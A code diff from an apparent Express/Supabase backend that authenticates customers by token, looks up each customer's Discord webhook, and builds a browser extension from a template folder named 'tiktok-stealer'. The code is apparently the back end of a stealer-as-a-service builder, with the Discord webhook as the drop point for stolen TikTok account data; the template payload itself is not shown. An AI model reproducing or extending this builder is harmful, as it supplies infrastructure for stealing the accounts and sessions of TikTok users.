@@ -33,7 +33,6 @@ async function verifyElitToken(token) {
 
   const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
 
-  // Try using the RPC function first
   try {
     const { data, error } = await supabase.rpc('verify_discord_api_token', {
       _token_hash: tokenHash
@@ -44,7 +43,6 @@ async function verifyElitToken(token) {
   } catch (e) {
     console.log('RPC failed, trying direct query:', e);
     
-    // Fallback to direct query
     const { data, error } = await supabase
       .from('discord_api_tokens')
       .select('discord_id')
@@ -62,45 +60,6 @@ app.get('/', (req, res) => {
   res.send('Extension Backend Running ✅');
 });
 
-// Save webhook endpoint
-app.put('/api/save-webhook', async (req, res) => {
-  const authHeader = req.headers.authorization;
-  
-  if (!authHeader) {
-    return res.status(401).json({ error: 'No token provided' });
-  }
-  
-  const token = authHeader.replace('Bearer ', '');
-  const { webhook } = req.body;
-  
-  if (!webhook || !webhook.startsWith('https://discord.com/api/webhooks/')) {
-    return res.status(400).json({ error: 'Invalid webhook URL' });
-  }
-  
-  try {
-    const discord_id = await verifyElitToken(token);
-    
-    if (!discord_id) {
-      return res.status(401).json({ error: 'Invalid token' });
-    }
-    
-    const { error: updateError } = await supabase
-      .from('profiles')
-      .update({ discord_webhook: webhook })
-      .eq('user_id', discord_id);
-    
-    if (updateError) {
-      console.error('Update error:', updateError);
-      return res.status(500).json({ error: 'Failed to save webhook' });
-    }
-    
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    console.error('Save webhook error:', error);
-    return res.status(500).json({ error: error.message });
-  }
-});
-
 // Generate extension endpoint
 app.get('/api/generate-extension', async (req, res) => {
   const { token } = req.query;
@@ -116,22 +75,23 @@ app.get('/api/generate-extension', async (req, res) => {
       return res.status(401).send('Invalid token');
     }
     
-    const { data: profile, error: profileError } = await supabase
-      .from('profiles')
+    // Check discord_verified_users table for webhook
+    const { data: discordUser, error: discordError } = await supabase
+      .from('discord_verified_users')
       .select('discord_webhook')
-      .eq('user_id', discord_id)
+      .eq('discord_id', discord_id)
       .single();
     
-    if (profileError) {
-      console.error('Profile error:', profileError);
-      return res.status(500).send('Error fetching profile: ' + profileError.message);
+    if (discordError) {
+      console.error('Discord user error:', discordError);
+      return res.status(500).send('Error fetching user: ' + discordError.message);
     }
     
-    if (!profile || !profile.discord_webhook) {
-      return res.status(400).send('No webhook configured. Please set your webhook in Settings first.');
+    if (!discordUser || !discordUser.discord_webhook) {
+      return res.status(400).send('No webhook configured. Please set your webhook in Settings → Webhook Configuration.');
     }
     
-    const webhook = profile.discord_webhook;
+    const webhook = discordUser.discord_webhook;
     
     // Read template files
     const templatePath = path.join(__dirname, 'templates', 'tiktok-stealer');
